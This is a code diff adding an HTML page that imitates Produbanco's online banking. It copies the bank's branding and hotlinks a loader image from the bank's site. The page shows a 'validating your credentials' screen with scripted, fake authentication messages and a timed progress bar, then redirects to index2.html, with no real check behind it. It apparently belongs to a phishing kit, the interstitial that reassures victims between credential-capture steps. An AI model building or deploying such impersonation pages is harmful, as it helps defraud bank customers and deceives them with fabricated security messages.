@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validando credenciales - Produbanco</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #003F20;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            margin: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 100vw;
+            min-height: 100vh;
+            background: #003F20;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 25px;
+            margin-top: 10px;
+        }
+
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            width: 25px;
+            height: 2px;
+            background: white;
+            margin: 3px 0;
+            border-radius: 1px;
+        }
+
+        .phone-icon {
+            cursor: pointer;
+        }
+
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+
+        .logo-img {
+            width: auto;
+            max-width: 380px;
+            height: 140px;
+            object-fit: contain;
+            margin-bottom: 15px;
+            filter: brightness(1.1);
+        }
+
+        .logo-subtitle {
+            color: white;
+            font-size: 16px;
+            font-weight: 300;
+            opacity: 0.9;
+        }
+
+        .loading-container {
+            background: white;
+            border-radius: 25px 25px 0 0;
+            flex: 1;
+            padding: 50px 25px;
+            min-height: 500px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .loading-title {
+            color: #003F20;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .loading-subtitle {
+            color: #666;
+            font-size: 18px;
+            font-weight: 400;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        .loader-gif {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+            border-radius: 50%;
+        }
+
+        .progress-container {
+            width: 100%;
+            max-width: 300px;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #003F20, #005a2e);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.3s ease;
+            animation: progressAnimation 10s linear forwards;
+        }
+
+        @keyframes progressAnimation {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .loading-message {
+            color: #888;
+            font-size: 14px;
+            font-weight: 400;
+            opacity: 0.8;
+        }
+
+        .dots {
+            animation: loadingDots 1.5s infinite;
+        }
+
+        @keyframes loadingDots {
+            0%, 20% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 450px) {
+            .container {
+                max-width: 100%;
+            }
+
+            .loading-container {
+                padding: 40px 20px;
+            }
+
+            .logo-img {
+                max-width: 320px;
+                height: 120px;
+            }
+
+            .loading-title {
+                font-size: 20px;
+            }
+
+            .loading-subtitle {
+                font-size: 16px;
+            }
+
+            .loader-gif {
+                width: 100px;
+                height: 100px;
+            }
+        }
+
+        /* Animación de fade in */
+        .fade-in {
+            animation: fadeIn 1s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container fade-in">
+        <!-- Header -->
+        <div class="header">
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="phone-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+                    <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                </svg>
+            </div>
+        </div>
+
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="logo1.png" alt="Grupo Promerica Logo" class="logo-img">
+            <p class="logo-subtitle"></p>
+        </div>
+
+        <!-- Loading Container -->
+        <div class="loading-container">
+            <h1 class="loading-title">Validando sus credenciales</h1>
+            <p class="loading-subtitle">Esto puede tardar un momento</p>
+
+            <img src="https://www.produbanco.com/Produnet/Imagen/DesignSystem/loader.gif" 
+                 alt="Cargando..." 
+                 class="loader-gif">
+
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+            </div>
+
+            <p class="loading-message">
+                Verificando información<span class="dots">...</span>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Variables de control
+            let timeRemaining = 10;
+            let redirected = false;
+
+            // Función para redirigir
+            function redirectToIndex2() {
+                if (!redirected) {
+                    redirected = true;
+                    window.location.href = 'index2.html';
+                }
+            }
+
+            // Configurar redirección automática después de 10 segundos
+            const redirectTimer = setTimeout(redirectToIndex2, 10000);
+
+            // Actualizar mensaje de carga cada segundo
+            const loadingMessage = document.querySelector('.loading-message');
+            const dotsElement = document.querySelector('.dots');
+
+            // Array de mensajes de carga aleatorios
+            const loadingMessages = [
+                'Verificando información',
+                'Validando credenciales',
+                'Procesando datos',
+                'Conectando con el servidor',
+                'Autenticando usuario',
+                'Cargando perfil'
+            ];
+
+            let messageIndex = 0;
+            const messageTimer = setInterval(function() {
+                if (!redirected) {
+                    loadingMessage.innerHTML = loadingMessages[messageIndex] + '<span class="dots">...</span>';
+                    messageIndex = (messageIndex + 1) % loadingMessages.length;
+                }
+            }, 2000);
+
+            // Contador visual opcional (comentado para mantener simplicidad)
+            /*
+            const countdownTimer = setInterval(function() {
+                if (timeRemaining > 0 && !redirected) {
+                    timeRemaining--;
+                } else {
+                    clearInterval(countdownTimer);
+                }
+            }, 1000);
+            */
+
+            // Limpiar timers si la página se cierra
+            window.addEventListener('beforeunload', function() {
+                clearTimeout(redirectTimer);
+                clearInterval(messageTimer);
+            });
+
+            // Función para manejar clics (opcional, para debug)
+            document.addEventListener('click', function(e) {
+                // Comentar la siguiente línea en producción
+                // console.log('Tiempo restante: ' + timeRemaining + ' segundos');
+            });
+
+            // Animación adicional para el contenedor principal
+            setTimeout(function() {
+                document.querySelector('.loading-container').style.transform = 'scale(1.02)';
+                setTimeout(function() {
+                    if (!redirected) {
+                        document.querySelector('.loading-container').style.transform = 'scale(1)';
+                    }
+                }, 200);
+            }, 2000);
+
+            // Precargar la siguiente página para transición más rápida
+            const link = document.createElement('link');
+            link.rel = 'preload';
+            link.href = 'index2.html';
+            link.as = 'document';
+            document.head.appendChild(link);
+
+            // Mensaje de consola para debug (opcional)
+            console.log('Página de carga iniciada. Redirección en 10 segundos...');
+        });
+    </script>
+</body>
+</html>
